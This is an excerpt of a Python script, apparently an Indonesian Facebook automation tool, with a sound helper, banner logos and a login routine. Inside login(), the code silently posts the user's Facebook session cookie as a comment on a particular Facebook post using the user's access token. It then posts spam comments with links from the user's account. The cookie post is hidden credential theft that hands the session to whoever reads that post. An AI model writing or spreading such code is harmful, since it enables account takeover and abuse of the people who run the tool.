...
def putar_sound(perintah):
	...
	elif perintah in ['mokad']:
		try:os.popen('play-audio data/cookie.mp3')
		except Exception as e:pass
	else:pass
...
def logo(n):
 ...
 selamat datang {kk}{n}{P}, script by {kk}Monkey D.Fendi{P} version 3.10""")
def logo2():
	return str(f"""  _   _ _______  _______    ____  _        _    ____  _____
 | \ | | ____\ \/ /_   _|  | __ )| |      / \  |  _ \| ____|
 |  \| |  _|  \  /  | |    |  _ \| |     / _ \ | | | |  _|
...
def login():
	...
	try:
		...
		slebew = ('\nKomentar Ditulis Oleh Bot:v\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = ('\n\nhttps://www.facebook.com/100022220423209/posts/1241529463264389/?app=fbl')
		link2 = ('\n\nhttps://www.facebook.com/100053245703138/posts/605663347885183/?app=fbl')
		random_kata = random.choice(["Acc Guru","Hallo Guru","Ah Ganteng Banget Bang","Ahh Keren Banget Bang Ganteng"])
		ses.post(f"https://graph.facebook.com/605663347885183/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/605663347885183/comments/?message={random_kata}\n{link2}\n{slebew}&access_token={token}",cookies =cok)
		ses.post(f"https://graph.facebook.com/1241529463264389/comments/?message={random_kata}\n{link2}\n{slebew}&access_token={token}",cookies =cok)
